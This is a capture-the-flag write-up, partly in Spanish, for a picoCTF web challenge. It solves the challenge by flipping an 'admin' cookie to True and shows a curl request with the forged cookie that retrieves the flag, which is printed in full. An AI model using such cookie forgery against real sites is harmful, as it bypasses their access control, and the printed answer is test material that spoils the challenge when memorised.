## Description
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/13594/` ([link](https://jupiter.challenges.picoctf.org/problem/13594/)) or http://jupiter.challenges.picoctf.org:13594

## Solución

Acceder con cualquier usuario y cualquier contraseña

Inspeccionar el código fuente y acceder a las cookies, cambiar el valor de admin False a True, guardar y recargar la página.

picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}


```bash
alberto_vc-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/13594/flag -H "Cookie: admin=True" | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}</code></p>
alberto_vc-picoctf@webshell:~$ 
```

## Notas Adicionales
|comando|descripcion|
|---|---|
|xx|xx|

## Referencias
- []()
